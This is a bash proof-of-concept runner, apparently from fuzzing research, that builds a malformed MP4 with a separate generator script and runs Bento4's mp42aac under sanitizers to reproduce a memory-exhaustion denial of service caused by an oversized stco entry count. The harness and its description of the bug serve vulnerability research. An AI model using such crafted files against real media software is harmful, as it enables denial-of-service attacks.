#!/usr/bin/env bash
set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4ContainerAtom_h"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
INPUT="$POC_DIR/vuln_003.mp4"
RESULT="$POC_DIR/vuln_003_result.txt"
ASAN_LOG_BASE="$POC_DIR/asan.log"

echo "=== VULN 003 PoC Run ===" | tee "$RESULT"
echo "Date: $(date)" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 1: Generate the malicious MP4
echo "[*] Generating malicious MP4..." | tee -a "$RESULT"
python3 "$POC_DIR/vuln_003_gen.py" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 2: Run mp42aac with ASAN
# Note: On systems with abundant memory (>1TB RAM), the OOM DoS from this
# vulnerability may not crash the process because 1-2GB allocations succeed
# via virtual memory, but stream.Read() fails (EOF), causing early return.
# On memory-constrained systems, bad_alloc would crash the program.
echo "[*] Running mp42aac (ASAN+UBSAN build)..." | tee -a "$RESULT"
echo "[*] Vulnerability: stco size=12, entry_count=0x10000000 read from out-of-bounds" | tee -a "$RESULT"
echo "[*] Expected: bounds-check underflow allows 1GB allocation attempt" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_BASE}:allocator_may_return_null=0" \
    "$BINARY" "$INPUT" /dev/null >> "$RESULT" 2>&1 || true
echo "" | tee -a "$RESULT"

# Step 3: Try with tight virtual memory limit to force bad_alloc
echo "[*] Retrying with virtual memory limit (512MB) to force OOM crash..." | tee -a "$RESULT"
(
    ulimit -v 524288  # 512 MB virtual memory limit
    ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_BASE}.limited:allocator_may_return_null=0" \
        "$BINARY" "$INPUT" /dev/null
) >> "$RESULT" 2>&1 || echo "[!] Binary crashed/exited non-zero under memory limit" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 4: Collect any ASAN log files
echo "[*] Checking for ASAN log files..." | tee -a "$RESULT"
ASAN_FILES=$(ls "${ASAN_LOG_BASE}".* 2>/dev/null || true)
if [ -n "$ASAN_FILES" ]; then
    echo "[!] ASAN log files found:" | tee -a "$RESULT"
    for f in $ASAN_FILES; do
        echo "--- $f ---" | tee -a "$RESULT"
        cat "$f" | tee -a "$RESULT"
        echo "" | tee -a "$RESULT"
    done
else
    echo "[*] No ASAN log files found." | tee -a "$RESULT"
fi

echo "=== Done ===" | tee -a "$RESULT"
